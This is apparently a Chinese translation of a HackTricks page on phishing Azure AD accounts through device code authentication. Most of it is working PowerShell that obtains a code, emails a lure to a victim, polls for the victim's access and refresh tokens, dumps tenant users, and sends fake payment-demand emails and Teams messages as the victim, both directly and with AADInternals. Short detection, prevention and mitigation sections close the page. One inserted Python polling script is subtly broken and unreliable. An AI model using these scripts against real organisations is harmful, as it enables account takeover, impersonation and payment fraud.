# Az - 设备代码身份验证钓鱼

<details>

<summary><strong>支持 HackTricks 并获得福利！</strong></summary>

* 如果您想在 HackTricks 中看到您的公司广告，或者如果您想访问 PEASS 的最新版本或下载 HackTricks 的 PDF，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS 和 HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来**分享您的黑客技巧**。

</details>

**此帖子的内容来自** [**https://o365blog.com/post/phishing/**](https://o365blog.com/post/phishing/)****

### 什么是设备代码身份验证 <a href="#what-is-device-code-authentication" id="what-is-device-code-authentication"></a>

根据微软的[文档](https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-device-code)，设备代码身份验证：

> 允许用户登录到输入受限设备，例如智能电视、物联网设备或打印机。为了启用此流程，设备要求用户在另一台设备上的浏览器中访问一个网页进行登录。一旦用户登录，设备就能够获取所需的访问令牌和刷新令牌。

该过程如下：

1. 用户在设备上启动支持设备代码流的应用程序
2. 应用程序连接到 Azure AD 的 /devicecode 端点，并发送 **client\_id** 和 **resource**
3. Azure AD 返回 **device\_code**、**user\_code** 和 **verification\_url**
4. 设备向用户显示 **verification\_url** (hxxps://microsoft.com/devicelogin) 和 **user\_code**
5. 用户打开浏览器并浏览到 **verification\_url**，在要求时提供 **user\_code** 并登录
6. 设备轮询 Azure AD，直到成功登录后获取 **access\_token** 和 **refresh\_token**

![设备代码流程](https://o365blog.com/images/posts/phishing\_5.png)

### 使用设备代码身份验证进行钓鱼 <a href="#phishing-with-device-code-authentication" id="phishing-with-device-code-authentication"></a>

利用设备代码身份验证进行钓鱼的基本思路如下。

1. 攻击者连接到 /devicecode 端点，并发送 **client\_id** 和 **resource**
2. 在收到 **verification\_uri** 和 **user\_code** 后，创建一封包含指向 **verification\_uri** 和 **user\_code** 的链接的电子邮件，并将其发送给受害者。
3. 受害者点击链接，提供代码并完成登录。
4. 攻击者接收到 **access\_token** 和 **refresh\_token**，现在可以模仿受害者。

#### 1. 连接到 /devicecode 端点 <a href="#1-connecting-to-devicecode-endpoint" id="1-connecting-to-devicecode-endpoint"></a>

第一步是向 Azure AD 的 devicecode 端点发出 HTTP POST 请求：
```
https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0
```
我使用了以下参数。我选择使用“Microsoft Office” client\_id，因为它看起来是最合法的应用程序名称，并且可以用于访问其他资源。所选资源提供对AAD Graph API的访问权限，该API由MSOnline PowerShell模块使用。

| 参数       | 值                                                     |
| ---------- | ------------------------------------------------------- |
| client\_id | d3590ed6-52b3-4102-aeff-aad2292ab01c                    |
| resource   | [https://graph.windows.net](https://graph.windows.net/) |

响应类似于以下内容：
```json
{
"user_code": "CLZ8HAV2L",
"device_code": "CAQABAAEAAAB2UyzwtQEKR7-rWbgdcBZIGm0IlLxBn23EWIrgw7fkNIKyMdS2xoEg9QAntABbI5ILrinFM2ze8dVKdixlThVWfM8ZPhq9p7uN8tYIuMkfVJ29aUnUBTFsYCmJCsZHkIxtmwdCsIlKpOQij2lJZzphfZX8j0nktDpaHVB0zm-vqATogllBjA-t_ZM2B0cgcjQgAA",
"verification_url": "https://microsoft.com/devicelogin",
"expires_in": "900",
"interval": "5",
"message": "To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code CLZ8HAV2L to authenticate."
}
```
| 参数              | 描述                                                                 |
| ----------------- | --------------------------------------------------------------------------- |
| user\_code        | 用户在请求时输入的代码                                   |
| device\_code      | 用于“轮询”身份验证结果的设备代码                    |
| verification\_url | 用户需要浏览以进行身份验证的URL                         |
| expires\_in       | 过期时间（15分钟）                                 |
| interval          | 客户端应轮询身份验证的时间间隔（以秒为单位） |
| message           | 预格式化的消息，显示给用户                            |

以下是连接到devicelogin端点的脚本：
```powershell
# Create a body, we'll be using client id of "Microsoft Office"

$body=@{
"client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
"resource" =  "https://graph.windows.net"
}

# Invoke the request to get device and user codes

$authResponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" -Body $body
$user_code =    $authResponse.user_code
```
#### 2. 创建钓鱼邮件 <a href="#2-creating-a-phishing-email" id="2-creating-a-phishing-email"></a>

现在我们已经有了**verification\_url**（始终相同）和**user\_code**，我们可以创建并发送钓鱼邮件。

**注意！** 发送邮件需要一个可用的 SMTP 服务。

以下是向受害者发送钓鱼邮件的脚本：
```powershell
# Create a message

$message = @"
<html>
Hi!<br>
Here is the link to the <a href="https://microsoft.com/devicelogin">document</a>. Use the following code to access: <b>$user_code</b>. <br><br>
</html>
"@

# Send the email

Send-MailMessage -from "Don Director <dond@something.com>" -to "william.victim@target.org" -Subject "Don shared a document with you" -Body $message -SmtpServer $SMTPServer -BodyAsHtml
```
收到的电子邮件如下所示：![设备代码流程](https://o365blog.com/images/posts/phishing\_6.png)

#### 3. “钓鱼” - 受害者执行身份验证 <a href="#3-catching-the-fish-victim-performs-the-authentication" id="3-catching-the-fish-victim-performs-the-authentication"></a>

当受害者点击链接时，会出现以下网站。正如我们所见，URL是一个合法的Microsoft URL。用户被要求输入电子邮件中的代码。

![设备代码](https://o365blog.com/images/posts/phishing\_7.png)

输入代码后，用户被要求选择要登录的用户。正如我们所见，用户被要求登录到**Microsoft Office** - 不需要任何同意。

**注意！**如果用户未登录，则用户需要使用目标组织使用的任何方法进行登录。

![登录](https://o365blog.com/images/posts/phishing\_8.png)

成功进行身份验证后，向用户显示以下内容。

![利润](https://o365blog.com/images/posts/phishing\_9.png)

:warning: **此时用户的身份已被泄露！** :warning:

#### 4. 检索访问令牌 <a href="#4-retrieving-the-access-tokens" id="4-retrieving-the-access-tokens"></a>

攻击者的最后一步是检索访问令牌。在完成第2步之后，攻击者开始轮询Azure AD以获取身份验证状态。

攻击者需要每5秒向Azure AD令牌端点发出HTTP POST请求：
```
https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0
```
请求必须包含以下参数（code是第1步中的device_code）

| 参数         | 值                                                                                                                                                                                                              |
| ----------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| client\_id  | d3590ed6-52b3-4102-aeff-aad2292ab01c                                                                                                                                                                             |
| resource    | [https://graph.windows.net](https://graph.windows.net/)                                                                                                                                                          |
| code        | CAQABAAEAAAB2UyzwtQEKR7-rWbgdcBZIGm0IlLxBn23EWIrgw7fkNIKyMdS2xoEg9QAntABbI5ILrinFM2ze8dVKdixlThVWfM8ZPhq9p7uN8tYIuMkfVJ29aUnUBTFsYCmJCsZHkIxtmwdCsIlKpOQij2lJZzphfZX8j0nktDpaHVB0zm-vqATogllBjA-t\_ZM2B0cgcjQgAA |
| grant\_type | urn:ietf:params:oauth:grant-type:device\_code                                                                                                                                                                    |

如果身份验证处于等待状态，则返回http错误**400 Bad Request**，内容如下：
```json
{
"error": "authorization_pending",
"error_description": "AADSTS70016: OAuth 2.0 device flow error. Authorization is pending. Continue polling.\r\nTrace ID: b35f261e-93cd-473b-9cf9-b81f30800600\r\nCorrelation ID: 8ee0ae8a-533f-4742-8334-e9ed939b083d\r\nTimestamp: 2020-10-14 06:06:07Z",
"error_codes": [70016],
"timestamp": "2020-10-13 18:06:07Z",
"trace_id": "b35f261e-93cd-473b-9cf9-b81f30800600",
"correlation_id": "8ee0ae8a-533f-4742-8334-e9ed939b083d",
"error_uri": "https://login.microsoftonline.com/error?code=70016"
}
```
登录成功后，我们将收到以下响应（令牌已截断）：
```json
{
"token_type": "Bearer",
"scope": "user_impersonation",
"expires_in": "7199",
"ext_expires_in": "7199",
"expires_on": "1602662787",
"not_before": "1602655287",
"resource": "https://graph.windows.net",
"access_token": "eyJ0eXAi...HQOT1rvUEOEHLeQ",
"refresh_token": "0.AAAAxkwD...WxPoK0Iq6W",
"foci": "1",
"id_token": "eyJ0eXAi...widmVyIjoiMS4wIn0."
}
```
以下脚本连接到Azure AD令牌端点并轮询身份验证状态。

```python
import requests
import time

# Azure AD token endpoint
token_endpoint = "https://login.microsoftonline.com/common/oauth2/v2.0/token"

# Client ID and redirect URI for the application
client_id = "YOUR_CLIENT_ID"
redirect_uri = "YOUR_REDIRECT_URI"

# Request parameters
params = {
    "client_id": client_id,
    "redirect_uri": redirect_uri,
    "response_type": "device_code",
    "scope": "openid",
}

# Request device code
response = requests.post(token_endpoint, data=params)
data = response.json()

# Check if device code is received
if "device_code" in data:
    device_code = data["device_code"]
    user_code = data["user_code"]
    verification_uri = data["verification_uri"]

    print(f"Please authenticate using the following code: {user_code}")
    print(f"Verification URL: {verification_uri}")

    # Poll for authentication status
    while True:
        time.sleep(data["interval"])
        response = requests.post(token_endpoint, data=params)
        data = response.json()

        if "access_token" in data:
            access_token = data["access_token"]
            print(f"Access token: {access_token}")
            break
        elif "error" in data:
            error = data["error"]
            print(f"Error: {error}")
            break
```

该脚本连接到Azure AD令牌端点并轮询身份验证状态。
```powershell
$continue = $true
$interval = $authResponse.interval
$expires =  $authResponse.expires_in

# Create body for authentication requests

$body=@{
"client_id" =  "d3590ed6-52b3-4102-aeff-aad2292ab01c"
"grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
"code" =       $authResponse.device_code
"resource" =   "https://graph.windows.net"
}

# Loop while authorisation is pending or until timeout exceeded

while($continue)
{
Start-Sleep -Seconds $interval
$total += $interval

if($total -gt $expires)
{
Write-Error "Timeout occurred"
return
}

# Try to get the response. Will give 40x while pending so we need to try&catch

try
{
$response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0 " -Body $body -ErrorAction SilentlyContinue
}
catch
{
# This is normal flow, always returns 40x unless successful

$details=$_.ErrorDetails.Message | ConvertFrom-Json
$continue = $details.error -eq "authorization_pending"
Write-Host $details.error

if(!$continue)
{
# Not pending so this is a real error

Write-Error $details.error_description
return
}
}

# If we got response, all okay!

if($response)
{
break # Exit the loop

}
}
```
现在我们可以使用访问令牌来冒充受害者：
```powershell
# Dump the tenant users to csv

Get-AADIntUsers -AccessToken $response.access_token | Export-Csv users.csv
```
只要client\_id保持不变，我们还可以使用刷新令牌来获取其他服务的访问令牌。

以下脚本获取Exchange Online的访问令牌。
```powershell
# Create body for getting access token for Exchange Online

$body=@{
"client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
"grant_type" =    "refresh_token"
"scope" =         "openid"
"resource" =      "https://outlook.office365.com"
"refresh_token" = $response.refresh_token
}

$EXOresponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token" -Body $body -ErrorAction SilentlyContinue

# Send email as the victim

Send-AADIntOutlookMessage -AccessToken $EXOresponse.access_token -Recipient "another.wictim@target.org" -Subject "Overdue payment" -Message "Pay this <h2>asap!</h2>"
```
## 使用 AADInternals 进行钓鱼攻击 <a href="#using-aadinternals-for-phishing" id="using-aadinternals-for-phishing"></a>

AADInternals（v0.4.4 或更高版本）具有一个 [Invoke-AADIntPhishing](https://o365blog.com/aadinternals/#invoke-aadintphishing) 函数，可以自动化钓鱼过程。

钓鱼消息可以自定义，以下是默认消息：
```
'<div>Hi!<br/>This is a message sent to you by someone who is using <a href="https://o365blog.com/aadinternals">AADInternals</a> phishing function. <br/><br/>Here is a <a href="{1}">link</a> you <b>should not click</b>.<br/><br/>If you still decide to do so, provide the following code when requested: <b>{0}</b>.</div>'
```
默认的电子邮件消息：\
![钓鱼邮件](https://o365blog.com/images/posts/phishing\_11.png)

默认的 Teams 消息：\
![钓鱼消息](https://o365blog.com/images/posts/phishing\_12.png)

### 电子邮件 <a href="#email" id="email"></a>

以下示例使用自定义消息发送钓鱼电子邮件。令牌将保存到缓存中。
```powershell
# Create a custom message

$message = '<html>Hi!<br/>Here is the link to the <a href="{1}">document</a>. Use the following code to access: <b>{0}</b>.</html>'

# Send a phishing email to recipients using a customised message and save the tokens to cache

Invoke-AADPhishing -Recipients "wvictim@company.com","wvictim2@company.com" -Subject "Johnny shared a document with you" -Sender "Johnny Carson <jc@somewhere.com>" -SMTPServer smtp.myserver.local -Message $message -SaveToCache
```

```
Code: CKDZ2BURF
Mail sent to: wvictim@company.com
...
Received access token for william.victim@company.com
```
现在我们可以使用缓存的令牌以受害者的身份发送电子邮件。
```powershell
# Send email as the victim

Send-AADIntOutlookMessage -Recipient "another.wictim@target.org" -Subject "Overdue payment" -Message "Pay this <h2>asap!</h2>"
```
我们还可以发送一条Teams消息，以使付款请求更加紧急：
```powershell
# Send Teams message as the victim

Send-AADIntTeamsMessage -Recipients "another.wictim@target.org" -Message "Just sent you an email about due payment. Have a look at it."
```

```
Sent                MessageID
----                ---------
16/10/2020 14.40.23 132473328207053858
```
**以下视频展示了如何使用AADInternals进行电子邮件钓鱼。**

### Teams <a href="#teams" id="teams"></a>

AADInternals支持将钓鱼消息发送为Teams聊天消息。

**注意！**在受害者“认证”并接收到令牌后，AADInternals将替换原始消息。可以使用-CleanMessage参数提供此消息。

默认的清理消息是：
```
'<div>Hi!<br/>This is a message sent to you by someone who is using <a href="https://o365blog.com/aadinternals">AADInternals</a> phishing function. <br/>If you are seeing this, <b>someone has stolen your identity!</b>.</div>'
```
![Teams clean message](https://o365blog.com/images/posts/phishing\_13.png)

以下示例使用自定义消息发送钓鱼邮件。令牌保存在缓存中。
```powershell
# Get access token for Azure Core Management

Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache

# Create the custom messages

$message = '<html>Hi!<br/>Here is the link to the <a href="{1}">document</a>. Use the following code to access: <b>{0}</b>.</html>'
$cleanMessage = '<html>Hi!<br/>Have a nice weekend.</html>'

# Send a teams message to the recipient using customised messages

Invoke-AADPhishing -Recipients "wvictim@company.com" -Teams -Message $message -CleanMessage $cleanMessage -SaveToCache
```

```
Code: CKDZ2BURF
Teams message sent to: wvictim@company.com. Message id: 132473151989090816
...
Received access token for william.victim@company.com
```
**以下视频展示了如何使用AADInternals进行Teams钓鱼。**

## 检测 <a href="#detecting" id="detecting"></a>

首先，从Azure AD的角度来看，登录发生在**发起**身份验证的地方。这是一个非常重要的观点需要理解。这意味着在登录日志中，登录是从**攻击者的位置和设备**进行的，而不是用户的位置和设备。

然而，使用刷新令牌获取的访问令牌**不会出现在登录日志中！**

下面是一个示例，我从Azure VM（更具体地说，是从[云shell](https://o365blog.com/post/cloudshell/)）发起了钓鱼攻击。正如我们所见，使用“Microsoft Office”客户端的登录发生在上午7:23，来自IP地址51.144.240.233。然而，在上午7:27获取Exchange Online的访问令牌并没有显示在日志中。

![Azure AD登录日志](https://o365blog.com/images/posts/phishing\_10.png)

:warning: 如果有迹象表明用户正在从非典型位置登录，用户帐户可能已被入侵。

## 预防 <a href="#preventing" id="preventing"></a>

防止使用此技术进行钓鱼的唯一有效方法是使用[条件访问](https://docs.microsoft.com/en-us/azure/active-directory/conditional-access/overview)（CA）策略。具体来说，**无法防止钓鱼**，但我们可以根据特定规则**阻止用户登录**。特别是基于位置和设备状态的策略对于保护帐户非常有效。这适用于当前使用的所有钓鱼技术。

然而，不可能涵盖所有情况。例如，如果用户使用多重身份验证登录，则强制要求从非法位置登录不起作用。

## 缓解 <a href="#mitigating" id="mitigating"></a>

如果用户已被入侵，可以[撤销](https://docs.microsoft.com/en-us/powershell/module/azuread/revoke-azureaduserallrefreshtoken?view=azureadps-2.0)用户的刷新令牌，从而防止攻击者使用被入侵的刷新令牌获取新的访问令牌。

## 总结 <a href="#summary" id="summary"></a>

据我所知，设备代码身份验证流技术以前尚未用于钓鱼。

从攻击者的角度来看，这种方法有几个优点：

* 不需要注册任何应用程序
* 不需要设置用于伪造登录页面等的钓鱼基础设施
* 用户只需登录（通常是“Microsoft Office”）- 不需要授权
* 所有操作都在**login.microsoftonline.com**命名空间中进行
* 攻击者可以使用任何client\_id和资源（不过并非所有组合都有效）
* 如果用户使用多重身份验证登录，则访问令牌也具有多重身份验证声明（包括使用刷新令牌获取的访问令牌）
* 防止需要条件访问（以及Azure AD Premium P1/P2许可证）

从攻击者的角度来看，这种方法至少有一个缺点：

* 用户代码仅有效15分钟

当然，攻击者可以通过向多个收件人发送钓鱼电子邮件来减少时间限制 - 这将增加有人使用代码登录的概率。

另一种方法是实现[代理](https://gist.github.com/Mr-Un1k0d3r/afef5a80cb72dfeaa78d14465fb0d333)，当链接被点击时开始身份验证（感谢[@MrUn1k0d3r](https://twitter.com/MrUn1k0d3r)）。然而，这种方式会丧失使用合法的microsoft.com网址的优势。

钓鱼活动生存的检查清单：

1. 向用户**提供有关信息安全和钓鱼的教育** :woman\_teacher:
2. 使用多重身份验证（MFA） :iphone:
3. 使用Intune :hammer\_and\_wrench: 和条件访问（CA） :stop\_sign:

\






<details>

<summary><strong>支持HackTricks并获得好处！</strong></summary>

* 如果您希望在HackTricks中看到您的**公司广告**，或者如果您想访问**PEASS的最新版本或下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享您的黑客技巧。**

</details>
